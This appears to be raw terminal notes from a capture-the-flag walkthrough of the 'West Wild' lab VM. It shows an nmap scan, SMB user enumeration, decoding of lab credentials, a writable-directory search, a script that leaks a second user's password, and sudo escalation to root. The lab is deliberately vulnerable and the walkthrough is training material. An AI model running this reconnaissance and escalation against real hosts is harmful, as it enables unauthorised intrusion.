@@ -1,0 +1,159 @@
+hack@kali:~$ nmap -A -p- 192.168.1.29
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-08 20:35 CET
+Nmap scan report for WestWild.homenet.telecomitalia.it (192.168.1.29)
+Host is up (0.00084s latency).
+Not shown: 65531 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 6f:ee:95:91:9c:62:b2:14:cd:63:0a:3e:f8:10:9e:da (DSA)
+|   2048 10:45:94:fe:a7:2f:02:8a:9b:21:1a:31:c5:03:30:48 (RSA)
+|   256 97:94:17:86:18:e2:8e:7a:73:8e:41:20:76:ba:51:73 (ECDSA)
+|_  256 23:81:c7:76:bb:37:78:ee:3b:73:e2:55:ad:81:32:72 (ED25519)
+80/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: WESTWILD; OS: Linux; CPE: cpe:/o:linux:linux_kernel                            
+                                                                                                   
+Host script results:                                                                               
+|_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: 0s                                     
+|_nbstat: NetBIOS name: WESTWILD, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)        
+| smb-os-discovery:                                                                                
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)                                                          
+|   Computer name: westwild                                                                        
+|   NetBIOS computer name: WESTWILD\x00                                                            
+|   Domain name: \x00                                                                              
+|   FQDN: westwild                                                                                 
+|_  System time: 2020-03-08T22:36:05+03:00                                                         
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-03-08T19:36:05
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.40 seconds
+
+
+
+connect to smb://192.168.1.29
+find flag and notes
+
+
+
+ ============================= 
+|    Users on 192.168.1.29    |
+ ============================= 
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: aveng    Name: aveng     Desc: 
+index: 0x2 RID: 0x3ea acb: 0x00000010 Account: wavex    Name: XxWavexX  Desc: 
+index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: root     Name: root      Desc: 
+
+user:[aveng] rid:[0x3e8]
+user:[wavex] rid:[0x3ea]
+user:[root] rid:[0x3e9]
+
+
+hack@kali:~/CTF/West_Wild_1_1$ cat FLAG1.txt 
+RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K
+hack@kali:~/CTF/West_Wild_1_1$ 
+hack@kali:~/CTF/West_Wild_1_1$ echo "RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K" | base64 -d
+Flag1{Welcome_T0_THE-W3ST-W1LD-B0rder}
+user:wavex
+password:door+open
+hack@kali:~/CTF/West_Wild_1_1$ 
+
+
+
+
+avex@WestWild:~$ find / -writable -type d 2>/dev/null
+/sys/fs/cgroup/systemd/user/1001.user/1.session                                                    
+/usr/share/av/westsidesecret                                                                       
+/home/wavex                                                                                        
+/home/wavex/.cache                                                                                 
+/home/wavex/wave                                                                                   
+/var/lib/php5                                                                                      
+/var/spool/samba                                                                                   
+/var/crash                                                                                         
+/var/tmp                                                                                           
+/proc/1389/task/1389/fd                                                                            
+/proc/1389/fd                                                                                      
+/proc/1389/map_files                                                                               
+/run/user/1001                                                                                     
+/run/shm                                                                                           
+/run/lock                                                                                          
+/tmp                                                                                               
+wavex@WestWild:~$                                                                                  
+wavex@WestWild:~$ 
+wavex@WestWild:~$ cd /usr/share/av
+av/    avahi/ 
+wavex@WestWild:~$ cd /usr/share/av/westsidesecret/
+wavex@WestWild:/usr/share/av/westsidesecret$ ls
+ififoregt.sh
+wavex@WestWild:/usr/share/av/westsidesecret$ ls -la
+total 12
+drwxrwxrwx 2 root  root  4096 Jul 30  2019 .
+drwxr-xr-x 3 root  root  4096 Jul 30  2019 ..
+-rwxrwxrwx 1 wavex wavex  101 Jul 30  2019 ififoregt.sh
+wavex@WestWild:/usr/share/av/westsidesecret$ cat ififoregt.sh 
+ #!/bin/bash 
+ figlet "if i foregt so this my way"
+ echo "user:aveng"
+ echo "password:kaizen+80"
+ 
+
+
+wavex@WestWild:/usr/share/av/westsidesecret$ sudo -u root ./ififoregt.sh 
+[sudo] password for wavex: 
+wavex is not in the sudoers file.  This incident will be reported.
+wavex@WestWild:/usr/share/av/westsidesecret$ 
+wavex@WestWild:/usr/share/av/westsidesecret$ 
+wavex@WestWild:/usr/share/av/westsidesecret$ ./ififoregt.sh 
+ _  __   _    __                      _                 _   _     _     
+(_)/ _| (_)  / _| ___  _ __ ___  __ _| |_   ___  ___   | |_| |__ (_)___ 
+| | |_  | | | |_ / _ \| '__/ _ \/ _` | __| / __|/ _ \  | __| '_ \| / __|
+| |  _| | | |  _| (_) | | |  __/ (_| | |_  \__ \ (_) | | |_| | | | \__ \
+|_|_|   |_| |_|  \___/|_|  \___|\__, |\__| |___/\___/   \__|_| |_|_|___/
+                                |___/                                   
+                                       
+ _ __ ___  _   _  __      ____ _ _   _ 
+| '_ ` _ \| | | | \ \ /\ / / _` | | | |
+| | | | | | |_| |  \ V  V / (_| | |_| |
+|_| |_| |_|\__, |   \_/\_/ \__,_|\__, |
+           |___/                 |___/ 
+user:aveng
+password:kaizen+80
+wavex@WestWild:/usr/share/av/westsidesecret$ 
+
+
+
+aveng@WestWild:/usr/share/av/westsidesecret$ sudo -l
+[sudo] password for aveng: 
+Matching Defaults entries for aveng on WestWild:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User aveng may run the following commands on WestWild:
+    (ALL : ALL) ALL
+aveng@WestWild:/usr/share/av/westsidesecret$ 
+aveng@WestWild:/usr/share/av/westsidesecret$ id
+uid=1000(aveng) gid=1000(aveng) groups=1000(aveng),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(sambashare),114(lpadmin)
+aveng@WestWild:/usr/share/av/westsidesecret$ sudo su
+root@WestWild:/usr/share/av/westsidesecret# id
+uid=0(root) gid=0(root) groups=0(root)
+root@WestWild:/usr/share/av/westsidesecret# cd /root/
+.bashrc           FLAG2.txt         .selected_editor  
+.cache/           .profile          .viminfo          
+root@WestWild:/usr/share/av/westsidesecret# cd /root/
+root@WestWild:~# cat FLAG2.txt 
+Flag2{Weeeeeeeeeeeellco0o0om_T0_WestWild}
+
+Great! take a screenshot and Share it with me in twitter @HashimAlshareff 
+
